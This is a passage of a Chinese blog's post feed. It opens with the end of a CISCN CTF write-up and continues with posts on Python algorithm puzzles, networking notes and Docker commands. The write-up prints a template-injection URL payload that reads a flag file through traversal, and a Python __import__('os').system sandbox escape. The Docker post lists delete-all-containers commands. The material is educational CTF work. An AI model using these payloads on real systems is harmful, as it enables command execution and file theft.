http://eci-2ze6ie6rtdji8r24knig.cloudeci1.ichunqiu.com/?a={if:(pass.thru)(%27cat%20../../../../flag%27)}{end%20if} miscmisc–签到题签到挺有意思，都是谁贡献了澳门的ip，tql！ misc–the_best_ctf_game这个题直接放到linux下 cat一下即可 flag都藏着尾巴处 REre–z3比较常规的逆向，打开后直接在main处F5 解方程 脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100from z3 import *solve = Solver()p=[]for i in range(42): p.append(Int(&#x27;p&#x27; + str(i)))v = [0 for i in range(42)]data = [ 0x4F17, 0x9CF6, 0x8DDB, 0x8EA6, 0x6929, 0x9911, 0x40A2, 0x2F3E, 0x62B6, 0x4B82, 0x486C, 0x4002, 0x52D7, 0x2DEF, 0x28DC, 0x640D, 0x528F, 0x613B, 0x4781, 0x6B17, 0x3237, 0x2A93, 0x615F, 0x50BE, 0x598E, 0x4656, 0x5B31, 0x313A, 0x3010, 0x67FE, 0x4D5F, 0x58DB, 0x3799, 0x60A0, 0x2750, 0x3759, 0x8953, 0x7122, 0x81F9, 0x5524, 0x8971, 0x3A1D]v[0] = 34 * p[3] + 12 * p[0] + 53 * p[1] + 6 * p[2] + 58 * p[4] + 36 * p[ 5] + p[6]v[1] = 27 * p[4] + 73 * p[3] + 12 * p[2] + 83 * p[0] + 85 * p[1] + 96 * p[ 5] + 52 * p[6]v[2] = 24 * p[2] + 78 * p[0] + 53 * p[1] + 36 * p[3] + 86 * p[4] + 25 * p[ 5] + 46 * p[6]v[3] = 78 * p[1] + 39 * p[0] + 52 * p[2] + 9 * p[3] + 62 * p[4] + 37 * p[ 5] + 84 * p[6]v[4] = 48 * p[4] + 14 * p[2] + 23 * p[0] + 6 * p[1] + 74 * p[3] + 12 * p[ 5] + 83 * p[6]v[5] = 15 * p[5] + 48 * p[4] + 92 * p[2] + 85 * p[1] + 27 * p[0] + 42 * p[ 3] + 72 * p[6]v[6] = 26 * p[5] + 67 * p[3] + 6 * p[1] + 4 * p[0] + 3 * p[2] + 68 * p[6]v[7] = 34 * p[10] + 12 * p[7] + 53 * p[8] + 6 * p[9] + 58 * p[11] + 36 * p[ 12] + p[13]v[8] = 27 * p[11] + 73 * p[10] + 12 * p[9] + 83 * p[7] + 85 * p[8] + 96 * p[ 12] + 52 * p[13]v[9] = 24 * p[9] + 78 * p[7] + 53 * p[8] + 36 * p[10] + 86 * p[11] + 25 * p[ 12] + 46 * p[13]v[10] = 78 * p[8] + 39 * p[7] + 52 * p[9] + 9 * p[10] + 62 * p[11] + 37 * p[ 12] + 84 * p[13]v[11] = 48 * p[11] + 14 * p[9] + 23 * p[7] + 6 * p[8] + 74 * p[10] + 12 * p[ 12] + 83 * p[13]v[12] = 15 * p[12] + 48 * p[11] + 92 * p[9] + 85 * p[8] + 27 * p[7] + 42 * p[ 10] + 72 * p[13]v[13] = 26 * p[12] + 67 * p[10] + 6 * p[8] + 4 * p[7] + 3 * p[9] + 68 * p[13]v[14] = 34 * p[17] + 12 * p[14] + 53 * p[15] + 6 * p[16] + 58 * p[18] + 36 * p[ 19] + p[20]v[15] = 27 * p[18] + 73 * p[17] + 12 * p[16] + 83 * p[14] + 85 * p[ 15] + 96 * p[19] + 52 * p[20]v[16] = 24 * p[16] + 78 * p[14] + 53 * p[15] + 36 * p[17] + 86 * p[ 18] + 25 * p[19] + 46 * p[20]v[17] = 78 * p[15] + 39 * p[14] + 52 * p[16] + 9 * p[17] + 62 * p[18] + 37 * p[ 19] + 84 * p[20]v[18] = 48 * p[18] + 14 * p[16] + 23 * p[14] + 6 * p[15] + 74 * p[17] + 12 * p[ 19] + 83 * p[20]v[19] = 15 * p[19] + 48 * p[18] + 92 * p[16] + 85 * p[15] + 27 * p[ 14] + 42 * p[17] + 72 * p[20]v[20] = 26 * p[19] + 67 * p[17] + 6 * p[15] + 4 * p[14] + 3 * p[16] + 68 * p[20]v[21] = 34 * p[24] + 12 * p[21] + 53 * p[22] + 6 * p[23] + 58 * p[25] + 36 * p[ 26] + p[27]v[22] = 27 * p[25] + 73 * p[24] + 12 * p[23] + 83 * p[21] + 85 * p[ 22] + 96 * p[26] + 52 * p[27]v[23] = 24 * p[23] + 78 * p[21] + 53 * p[22] + 36 * p[24] + 86 * p[ 25] + 25 * p[26] + 46 * p[27]v[24] = 78 * p[22] + 39 * p[21] + 52 * p[23] + 9 * p[24] + 62 * p[25] + 37 * p[ 26] + 84 * p[27]v[25] = 48 * p[25] + 14 * p[23] + 23 * p[21] + 6 * p[22] + 74 * p[24] + 12 * p[ 26] + 83 * p[27]v[26] = 15 * p[26] + 48 * p[25] + 92 * p[23] + 85 * p[22] + 27 * p[ 21] + 42 * p[24] + 72 * p[27]v[27] = 26 * p[26] + 67 * p[24] + 6 * p[22] + 4 * p[21] + 3 * p[23] + 68 * p[27]v[28] = 34 * p[31] + 12 * p[28] + 53 * p[29] + 6 * p[30] + 58 * p[32] + 36 * p[ 33] + p[34]v[29] = 27 * p[32] + 73 * p[31] + 12 * p[30] + 83 * p[28] + 85 * p[ 29] + 96 * p[33] + 52 * p[34]v[30] = 24 * p[30] + 78 * p[28] + 53 * p[29] + 36 * p[31] + 86 * p[ 32] + 25 * p[33] + 46 * p[34]v[31] = 78 * p[29] + 39 * p[28] + 52 * p[30] + 9 * p[31] + 62 * p[32] + 37 * p[ 33] + 84 * p[34]v[32] = 48 * p[32] + 14 * p[30] + 23 * p[28] + 6 * p[29] + 74 * p[31] + 12 * p[ 33] + 83 * p[34]v[33] = 15 * p[33] + 48 * p[32] + 92 * p[30] + 85 * p[29] + 27 * p[ 28] + 42 * p[31] + 72 * p[34]v[34] = 26 * p[33] + 67 * p[31] + 6 * p[29] + 4 * p[28] + 3 * p[30] + 68 * p[34]v[35] = 34 * p[38] + 12 * p[35] + 53 * p[36] + 6 * p[37] + 58 * p[39] + 36 * p[ 40] + p[41]v[36] = 27 * p[39] + 73 * p[38] + 12 * p[37] + 83 * p[35] + 85 * p[ 36] + 96 * p[40] + 52 * p[41]v[37] = 24 * p[37] + 78 * p[35] + 53 * p[36] + 36 * p[38] + 86 * p[ 39] + 25 * p[40] + 46 * p[41]v[38] = 78 * p[36] + 39 * p[35] + 52 * p[37] + 9 * p[38] + 62 * p[39] + 37 * p[ 40] + 84 * p[41]v[39] = 48 * p[39] + 14 * p[37] + 23 * p[35] + 6 * p[36] + 74 * p[38] + 12 * p[ 40] + 83 * p[41]v[40] = 15 * p[40] + 48 * p[39] + 92 * p[37] + 85 * p[36] + 27 * p[ 35] + 42 * p[38] + 72 * p[41]v[41] = 26 * p[40] + 67 * p[38] + 6 * p[36] + 4 * p[35] + 3 * p[37] + 68 * p[41]for i in range(42): solve.add(v[i] == data[i])print(solve.check())m = solve.model()for i in range(42): print(chr(((m[p[i]])).as_long()),end=&#x27;&#x27;) cryptocrypto–bde很大的，d可能就会比较小，可能会满足Wiener’s attack的条件 低解密指数攻击 原理：当pq很大时，phin大小接近n e*d-1=k*phin 两边同除d*phin e/phin-k/d=1/(d*phin) 因为d*phin很大，所以e/N稍大于k/d 这样我们通过展开e/N连分数求出每个渐进分数 即可求出phin，再联立解方程求出私钥p,q 解题使用github上的开源工具https://github.com/pablocelayes/rsa-wiener-attack 直接得到d 123from Crypto.Util.number import *m = long_to_bytes(pow(c, d, n))print(m) 得到flag pwnpwn–babyjsc 随便输入一点东西报python的input错误 从而输入 1__import__(&#x27;os&#x27;).system(&#x27;cat ./home/ctf/flag&#x27;)","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"http://m0th.top/tags/ciscn/"}]},{"title":"算法入门--保持一致","slug":"算法入门-保持一致","date":"2020-08-17T10:29:55.000Z","updated":"2020-08-19T09:18:10.515Z","comments":true,"path":"2020/08/17/算法入门-保持一致/","link":"","permalink":"http://m0th.top/2020/08/17/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E4%BF%9D%E6%8C%81%E4%B8%80%E8%87%B4/","excerpt":"今天学一下遍历的算法，主要应用方向是用来简单的数据压缩","text":"今天学一下遍历的算法，主要应用方向是用来简单的数据压缩 0x01 基本问题及解决假定有了对应于一组排队等待人员的帽子方向列表，喊出几条命令使得，使得所有人的帽子都朝向一个方向 12345678910111213141516171819202122def pleaseConform(caps): start=forward=backward=0 intervals=[] caps=caps+[&#x27;END&#x27;] for i in range(1,len(caps)): if caps[start]!=caps[i]: intervals.append((start,i-1,caps[start])) if caps[start]==&#x27;F&#x27;: forward+=1 else : backward +=1 start = i if forward&lt;backward: flip=&quot;F&quot; else: flip=&quot;B&quot; for t in intervals: if t[2]== flip: if t[0]==t[1]: print(&#x27;people in position&#x27;,t[1],&#x27;filp you caps!&#x27;) else: print(&#x27;people in positions&#x27;,t[0],&#x27;through&#x27;,t[1],&#x27;filp you caps!&#x27;) 以上用到的算法思想是计算一个”区间”的列表，对应于各段戴帽子方式相同的连续人群。同时区间列表记录区间的三种性质为一个元素，开始位置、结束位置以及帽子的方向，且用forward和backword两个计数器，一但该区间列表方向确定，就在该方向的计数器上加一，最后统计比较计数器的值，从而决定是输出区间列表里的帽子方向是正还是反的值 0x02 代码优化以上算法并不完美，究其原因主要是进行了两次遍历，第一次是对帽子方向列表的遍历，第二次是对区间列表的遍历，如果进行一次遍历，是否能够直接得出我们想要的输出命令呢 tips: 正戴区间和反戴区间的数量最多差1，观察第一个人是正戴还是反戴，如果是正戴，则正戴的区间数量永远不小于反戴，如果是反戴，则反戴的区间数量永远不小于正戴。 从而我们可以得到单次遍历的算法 123456789101112131415161718192021222324#原版def pleaseConformOnepass(caps): caps=caps+[caps[0]] #这里加上帽子方向列表的最后一个元素，目的是方便循环 for i in range(1,len(caps)): if caps[i]!=caps[i-1]: if caps[i]!=caps[0]: print(&#x27;People in postion&#x27;,i,end=&#x27;&#x27;) else: print(&#x27;through&#x27;,i-1,&#x27;flip your caps&#x27;)#改进一下，输出更好看一些def pleaseConformOnepass(caps): caps=caps+[caps[0]] #这里加上帽子方向列表的最后一个元素，目的是方便循环 for i in range(1,len(caps)): if caps[i]!=caps[i-1]: if caps[i]!=caps[0]: if caps[i-1]==caps[i+1]: print(&#x27;People in position &#x27;,i,&#x27;filp your caps&#x27;) else: print(&#x27;People in postion&#x27;,i,end=&#x27;&#x27;) else: if caps[i]==caps[i-2]: continue else: print(&#x27;through&#x27;,i-1,&#x27;flip your caps&#x27;) 0x03 复杂问题假设在队伍中存在没戴帽子的人。我们用字符’H’表示他们，不得令没戴帽子的人改变帽子方向，我们该怎么办 1234567891011121314151617181920212223242526cap3=[&#x27;F&#x27;,&#x27;F&#x27;,&#x27;B&#x27;,&#x27;H&#x27;,&#x27;B&#x27;,&#x27;F&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;F&#x27;,&#x27;H&#x27;,&#x27;F&#x27;,&#x27;F&#x27;]def pleaseConformOnepass(caps): start=backword=forword=0 intervals=[] caps=caps+[&#x27;END&#x27;] for i in range(1,len(caps)): if caps[start]!=caps[i]: intervals.append((start,i-1,caps[start])) if caps[start]==&#x27;F&#x27;: forword+=1 elif caps[start]== &#x27;B&#x27;: backword+=1 start = i if backword&gt;=forword: flipword=&#x27;F&#x27; else: flipword=&#x27;B&#x27; for t in intervals: if t[2] == flipword : if t[0]==t[1]: print(&#x27;people in postion&#x27;,t[0],&#x27;flip your caps!&#x27;) else: print(&#x27;people in postions&#x27;,t[0],&#x27;thourgh&#x27;,t[1],&#x27;flip your caps!&#x27;)pleaseConformOnepass(cap3) 这个跟基础问题感觉差距不大，都是组成一个区间性质列表 0x04 实际编码问题如何把简单的’BBWWWWWZZZIIIIPPPP’编码为’2B5W3Z4I4P‘的形式呢 那又如何把’2B5W3Z4I4P‘解码为’BBWWWWWZZZIIIIPPPP’的形式呢 encoding1234567891011121314def encode(string): string_list=list(string) #print(string_list) start=0 intervals=[] end=&#x27;&#x27; for i in range(1,len(string_list)): if string[start]!=string_list[i]: intervals.append([str(i-start),string_list[start]]) start=i for t in intervals: end=end+&#x27;&#x27;.join(t) return end decoding","categories":[{"name":"用python解决算法谜题","slug":"用python解决算法谜题","permalink":"http://m0th.top/categories/%E7%94%A8python%E8%A7%A3%E5%86%B3%E7%AE%97%E6%B3%95%E8%B0%9C%E9%A2%98/"}],"tags":[{"name":"算法入门","slug":"算法入门","permalink":"http://m0th.top/tags/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"}]},{"title":"计算机网络基础笔记","slug":"计算机网络基础笔记","date":"2020-08-13T14:59:24.000Z","updated":"2021-03-26T09:44:45.857Z","comments":true,"path":"2020/08/13/计算机网络基础笔记/","link":"","permalink":"http://m0th.top/2020/08/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/","excerpt":"计算机网络基础，在阿里云大学学的，刚开始学","text":"计算机网络基础，在阿里云大学学的，刚开始学 概述 计算机网络概念 计算机网络是自主计算机的互连集合 计算机网络是网络硬件和网络协议的统一体 网络交换技术 有三种交换技术分别为电路交换 报文交换 分组交换 实现分组交换时的两个不同的分类方式 数据报方式 虚电路方式 网络拓扑结构 星型拓扑 环形拓扑 树形拓扑 网状型拓扑 总线型拓扑","categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://m0th.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://m0th.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"docker从入门到精通(二)","slug":"docker从入门到精通-二","date":"2020-08-13T14:28:29.000Z","updated":"2021-03-26T09:44:54.508Z","comments":true,"path":"2020/08/13/docker从入门到精通-二/","link":"","permalink":"http://m0th.top/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/","excerpt":"跟着狂神的课学docker感觉还不错，docker的常用命令打卡","text":"跟着狂神的课学docker感觉还不错，docker的常用命令打卡 Docker常用命令帮助命令 123docker version #显示docker版本信息docker info #显示docker的系统信息，包括镜像和容器的数量 docker 命令 --help #帮助命令 镜像命令 docker images 查看镜像 1234567891011121314151617181920212223[root@iZ2oaf2ocgsgqtZ ~]# docker images --helpOptions: -a, --all Show all images (default hides intermediate images) --digests Show digests -f, --filter filter Filter output based on conditions provided --format string Pretty-print images using a Go template --no-trunc Don&#x27;t truncate output -q, --quiet Only show numeric IDs[root@iZ2oaf2ocgsgqtZ ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest 8cf1bfb43ff5 3 weeks ago 132MBmattrayner/lamp latest 05750cfa54d5 3 weeks ago 915MBhello-world latest bf756fb1ae65 7 months ago 13.3kB#解释ERPOSITORY #镜像的仓库源TAG #镜像的标签IMAGE ID #镜像的idCREATED #镜像的创建时间SIZE #镜像的大小 docker search 搜索镜像 12345678910[root@iZ2oaf2ocgsgqtZ ~]# docker search mysqlNAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relation… 9838 [OK] mariadb MariaDB is a community-developed fork of MyS… 3591 [OK] #可选项，通过收藏来过滤--filter=STARS=3000 #搜索出来的镜像stars数大于3000[root@iZ2oaf2ocgsgqtZ ~]# docker search mysql --filter=stars=3000NAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relation… 9838 [OK] mariadb MariaDB is a community-developed fork of MyS… 3591 [OK] docker pull 下载镜像 1234567891011121314151617181920212223242526272829303132333435#下载镜像 docker pull 镜像名[:tag][root@iZ2oaf2ocgsgqtZ ~]# docker pull mysqlUsing default tag: latest #如果不写 tag，默认就是latestlatest: Pulling from library/mysqlbf5952930446: Pull complete #分层下载，docker images的核心 联合文件系统8254623a9871: Pull complete 938e3e06dac4: Pull complete ea28ebf28884: Pull complete f3cef38785c2: Pull complete 894f9792565a: Pull complete 1d8a57523420: Pull complete 6c676912929f: Pull complete ff39fdb566b4: Pull complete fff872988aba: Pull complete 4d34e365ae68: Pull complete 7886ee20621e: Pull complete Digest: sha256:c358e72e100ab493a0304bda35e6f239db2ec8c9bb836d8a427ac34307d074ed #签名Status: Downloaded newer image for mysql:latestdocker.io/library/mysql:latest #真实地址[root@iZ2oaf2ocgsgqtZ ~]# docker pull mysql:5.75.7: Pulling from library/mysqlbf5952930446: Already exists 8254623a9871: Already exists 938e3e06dac4: Already exists ea28ebf28884: Already exists f3cef38785c2: Already exists 894f9792565a: Already exists 1d8a57523420: Already exists 5f09bf1d31c1: Pull complete 1b6ff254abe7: Pull complete 74310a0bf42d: Pull complete d398726627fd: Pull complete Digest: sha256:da58f943b94721d46e87d5de208dc07302a8b13e638cd1d24285d222376d6d84Status: Downloaded newer image for mysql:5.7docker.io/library/mysql:5.7 docker rmi 删除镜像！ 123docker rmi -f 容器id #删除指定的容器docker rmi -f 容器id 容器id 容器id 容器id #删除多个容器docker rmi -f $(docker images -aq) #删除全部的容器 容器命令 说明：我们有了镜像才可以创建容器，linux，下载一个centos镜像来测试学习 1docker pull centos 新建容器并启动 12345678910111213141516171819202122232425docker run [可选参数] image#参数说明--name=“Name” 容器命名 tomcat01，tomcat02，用来区分容器-d 后台方式运行-it 使用交互方式运行 进入容器查看内容-p 指定容器的端口 -p 8080:8080 #-p ip:主机端口：容器端口 #-p 容器端口：容器端口 #-p 容器端口 #容器端口-P 随机指定端口#测试，启动并进入容器[root@iZ2oaf2ocgsgqtZ ~]# docker run -it centos /bin/bash[root@3d988e323015 /]# lsbin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var#从容器中退回到服务器[root@3d988e323015 /]# exitexit[root@iZ2oaf2ocgsgqtZ ~]# ls[root@iZ2oaf2ocgsgqtZ ~]# cd ../[root@iZ2oaf2ocgsgqtZ /]# lsbin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 列出所有的运行的容器 1234567891011121314#docker ps 列出当前正在运行的容器-a #列出当前正在运行的容器+历史运行过的容器-n=？ #显示最近创建的容器-q #只显示容器的编号[root@iZ2oaf2ocgsgqtZ /]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8d22f31c06c3 mattrayner/lamp &quot;/run.sh&quot; 8 days ago Up 8 days 0.0.0.0:80-&gt;80/tcp, 3306/tcp web_xiazhu[root@iZ2oaf2ocgsgqtZ /]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES3d988e323015 centos &quot;/bin/bash&quot; 4 minutes ago Exited (0) 2 minutes ago youthful_kirch8d1772abc79e hello-world &quot;/hello&quot; 46 hours ago Exited (0) 46 hours ago xenodochial_noyce8d22f31c06c3 mattrayner/lamp &quot;/run.sh&quot; 8 days ago Up 8 days 0.0.0.0:80-&gt;80/tcp, 3306/tcp web_xiazhu 退出容器 12exit #退出容器停止并退出Ctrl + P+Q #容器不停止退出 删除容器 123docker rm 容器id #删除指定的容器,不能删除正在运行的容器，需要加-fdocker rm -f $(docker ps -aq) #删除所有容器docker ps -a -q|xargs docker rm #删除若有容器 启动和停止容器的操作 1234docker start 容器id #启动容器docker restart 容器id #重启容器 docker stop 容器id #停止容器docker kill 容器id #强制停止当前容器 常用其他命令 后台启动容器 123456#命令 docker run -d 镜像名！[root@iZ2oaf2ocgsgqtZ /]# docker run -d centos#问题 docker ps。发现centos 停止了#常见的坑:docker 容器使用后台运行，就必须要有一个前台的进程，docker发现没有应用，就会自动停止#nginx，容器启动后，发现没有提供服务，就会立刻停止，就是没有程序了 查看日志 12345678docker logs -f -t --tail 容器id #如果容器没有日志，自己编写了一段shell脚本 docker run -d centos /bin/sh -c &quot;while true;do echo M0th;sleep 1;done&quot;#显示日志-tf #显示日志--tail number #显示日志条数[root@iZ2oaf2ocgsgqtZ /]# docker logs -tf 71dbe6949346 查看容器中进程信息 ps 12345#命令 docker top 容器id[root@iZ2oaf2ocgsgqtZ ~]# docker top 8d22f31c06c3 UID PID PPID C STIME TTY TIME CMDroot 20245 20229 0 Aug05 ? 00:02:29 /usr/bin/python3 /usr/local/bin/supervisord -nroot 20778 20245 0 Aug05 ? 00:00:25 查看镜像的元数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259#命令 docker inspect 容器id[root@iZ2oaf2ocgsgqtZ ~]# docker inspect 8d22f31c06c3 [ &#123; &quot;Id&quot;: &quot;8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e&quot;, &quot;Created&quot;: &quot;2020-08-05T12:30:31.628557831Z&quot;, &quot;Path&quot;: &quot;/run.sh&quot;, &quot;Args&quot;: [], &quot;State&quot;: &#123; &quot;Status&quot;: &quot;running&quot;, &quot;Running&quot;: true, &quot;Paused&quot;: false, &quot;Restarting&quot;: false, &quot;OOMKilled&quot;: false, &quot;Dead&quot;: false, &quot;Pid&quot;: 20245, &quot;ExitCode&quot;: 0, &quot;Error&quot;: &quot;&quot;, &quot;StartedAt&quot;: &quot;2020-08-05T12:30:32.123111712Z&quot;, &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot; &#125;, &quot;Image&quot;: &quot;sha256:05750cfa54d5c07510961007006dfaae6849739487a550e6d7588c9b550625cb&quot;, &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e/resolv.conf&quot;, &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e/hostname&quot;, &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e/hosts&quot;, &quot;LogPath&quot;: &quot;/var/lib/docker/containers/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e-json.log&quot;, &quot;Name&quot;: &quot;/web_xiazhu&quot;, &quot;RestartCount&quot;: 0, &quot;Driver&quot;: &quot;overlay2&quot;, &quot;Platform&quot;: &quot;linux&quot;, &quot;MountLabel&quot;: &quot;&quot;, &quot;ProcessLabel&quot;: &quot;&quot;, &quot;AppArmorProfile&quot;: &quot;&quot;, &quot;ExecIDs&quot;: [ &quot;d3caf6aedf329e2db44c6e62d9a7551ec2e8238101f4bbb4afec12cb8fe32da9&quot; ], &quot;HostConfig&quot;: &#123; &quot;Binds&quot;: [ &quot;/home/test/xiazhu/:/app&quot; ], &quot;ContainerIDFile&quot;: &quot;&quot;, &quot;LogConfig&quot;: &#123; &quot;Type&quot;: &quot;json-file&quot;, &quot;Config&quot;: &#123;&#125; &#125;, &quot;NetworkMode&quot;: &quot;default&quot;, &quot;PortBindings&quot;: &#123; &quot;80/tcp&quot;: [ &#123; &quot;HostIp&quot;: &quot;&quot;, &quot;HostPort&quot;: &quot;80&quot; &#125; ] &#125;, &quot;RestartPolicy&quot;: &#123; &quot;Name&quot;: &quot;no&quot;, &quot;MaximumRetryCount&quot;: 0 &#125;, &quot;AutoRemove&quot;: false, &quot;VolumeDriver&quot;: &quot;&quot;, &quot;VolumesFrom&quot;: null, &quot;CapAdd&quot;: null, &quot;CapDrop&quot;: null, &quot;Capabilities&quot;: null, &quot;Dns&quot;: [], &quot;DnsOptions&quot;: [], &quot;DnsSearch&quot;: [], &quot;ExtraHosts&quot;: null, &quot;GroupAdd&quot;: null, &quot;IpcMode&quot;: &quot;private&quot;, &quot;Cgroup&quot;: &quot;&quot;, &quot;Links&quot;: null, &quot;OomScoreAdj&quot;: 0, &quot;PidMode&quot;: &quot;&quot;, &quot;Privileged&quot;: false, &quot;PublishAllPorts&quot;: false, &quot;ReadonlyRootfs&quot;: false, &quot;SecurityOpt&quot;: null, &quot;UTSMode&quot;: &quot;&quot;, &quot;UsernsMode&quot;: &quot;&quot;, &quot;ShmSize&quot;: 67108864, &quot;Runtime&quot;: &quot;runc&quot;, &quot;ConsoleSize&quot;: [ 0, 0 ], &quot;Isolation&quot;: &quot;&quot;, &quot;CpuShares&quot;: 0, &quot;Memory&quot;: 0, &quot;NanoCpus&quot;: 0, &quot;CgroupParent&quot;: &quot;&quot;, &quot;BlkioWeight&quot;: 0, &quot;BlkioWeightDevice&quot;: [], &quot;BlkioDeviceReadBps&quot;: null, &quot;BlkioDeviceWriteBps&quot;: null, &quot;BlkioDeviceReadIOps&quot;: null, &quot;BlkioDeviceWriteIOps&quot;: null, &quot;CpuPeriod&quot;: 0, &quot;CpuQuota&quot;: 0, &quot;CpuRealtimePeriod&quot;: 0, &quot;CpuRealtimeRuntime&quot;: 0, &quot;CpusetCpus&quot;: &quot;&quot;, &quot;CpusetMems&quot;: &quot;&quot;, &quot;Devices&quot;: [], &quot;DeviceCgroupRules&quot;: null, &quot;DeviceRequests&quot;: null, &quot;KernelMemory&quot;: 0, &quot;KernelMemoryTCP&quot;: 0, &quot;MemoryReservation&quot;: 0, &quot;MemorySwap&quot;: 0, &quot;MemorySwappiness&quot;: null, &quot;OomKillDisable&quot;: false, &quot;PidsLimit&quot;: null, &quot;Ulimits&quot;: null, &quot;CpuCount&quot;: 0, &quot;CpuPercent&quot;: 0, &quot;IOMaximumIOps&quot;: 0, &quot;IOMaximumBandwidth&quot;: 0, &quot;MaskedPaths&quot;: [ &quot;/proc/asound&quot;, &quot;/proc/acpi&quot;, &quot;/proc/kcore&quot;, &quot;/proc/keys&quot;, &quot;/proc/latency_stats&quot;, &quot;/proc/timer_list&quot;, &quot;/proc/timer_stats&quot;, &quot;/proc/sched_debug&quot;, &quot;/proc/scsi&quot;, &quot;/sys/firmware&quot; ], &quot;ReadonlyPaths&quot;: [ &quot;/proc/bus&quot;, &quot;/proc/fs&quot;, &quot;/proc/irq&quot;, &quot;/proc/sys&quot;, &quot;/proc/sysrq-trigger&quot; ] &#125;, &quot;GraphDriver&quot;: &#123; &quot;Data&quot;: &#123; &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/ebebfaa4b93ab4d3ff6427c01ec419d58ee297be87c2eedbc2dcd4de5167b334-init/diff:/var/lib/docker/overlay2/c1343d6ef5f96ef7b8788ba30857be230a33625f29b488b4c0c70fb21adfb08e/diff:/var/lib/docker/overlay2/2e9f1c384547dbd7a124f5b6eb4c1ab15873cef0ce5066626fe0861e4eddab52/diff:/var/lib/docker/overlay2/31e671bc91fec3af9fad626e6d73af70ec332172e15212e6462f6e6973d87419/diff:/var/lib/docker/overlay2/f7102f0680b31edb1e3b5c53d89ad1b639e9c41358ea586b3fc84aa5b4641aef/diff:/var/lib/docker/overlay2/1b84b765199b9cedfc2f6ea58636656f5961caa1f8ba37b7909d8a1742493b75/diff:/var/lib/docker/overlay2/6ac3df1e16de1e6288bd0645fc5556b6c522a28408679a76c44c4350e4fc9ca1/diff:/var/lib/docker/overlay2/76afcff3df12508920dd1defb189791018bad6d87756b1e23a3aec1a2efdfcce/diff:/var/lib/docker/overlay2/9a8b202f8cfe6f753c47b88797b59f35190801ab8e334e20923b8c98c684fb5a/diff:/var/lib/docker/overlay2/a4a93d61566664522c4d98682057dd6797ce5f1cbae3ef7abe846e2cf32be798/diff:/var/lib/docker/overlay2/649a9d94d57323c8b4137a8e5b812621b6ee837141baa172ef9204c49074f777/diff:/var/lib/docker/overlay2/c1ccb19bec5233d60e65a447c89f070769210055f85448bca2af18f12ea90fcd/diff:/var/lib/docker/overlay2/91244974b7898ed4a79eb8a2734725e8f9620d2d03c8b529710fa024fe86af4d/diff:/var/lib/docker/overlay2/6d2fe1d6c57ef834de5dc8796357d4c0a0f3a270edb4e3e87daa6e444b47ce69/diff:/var/lib/docker/overlay2/653fcbce9d13f98dbf5d4cb545bf7a1da5371f8a746ba8b8ea3a3b5959d07a17/diff:/var/lib/docker/overlay2/d36609d04bc0e8ea0f365ecf570fc26e0d9fc364bd2d6ad0a8bf88cad8f849b1/diff:/var/lib/docker/overlay2/a717d0eb3b83c51f58b392b2cfda562737351dc2e0881622426242f5e478e57e/diff:/var/lib/docker/overlay2/065f71e31df3cd3fcc006f0d83fb9ecb9913bf6068666a49c7848a7af1ec7743/diff:/var/lib/docker/overlay2/7fd6afde1cda0152e3ad18b8db54479e36b3bd5e70eacd06c5f4a7feee7de17a/diff:/var/lib/docker/overlay2/ef5d5f11888435af3f971616b126560968d60f3eabd8d117a9dddd2da6d63ad0/diff:/var/lib/docker/overlay2/d5f4a70934da8614824485ef3d83395ee460cb79de2c76b0ced1f02525a53664/diff:/var/lib/docker/overlay2/a91a8e08e2f10182e3104d81c74274e3ad9ffc8c6e2a92077f0ee3d5353cc1b1/diff:/var/lib/docker/overlay2/afaa392ae9da980a4396a44659fcfb9c0651e1393c4f8556de954f620840584c/diff:/var/lib/docker/overlay2/7acc3573b193f9069c54dfd93a7ced575f79a29f6be80a2d4659055158c77c3d/diff:/var/lib/docker/overlay2/e61644b54ff01f528f9567280cdd9706da6efebe5a7d690eeae6c82c57edd4c4/diff:/var/lib/docker/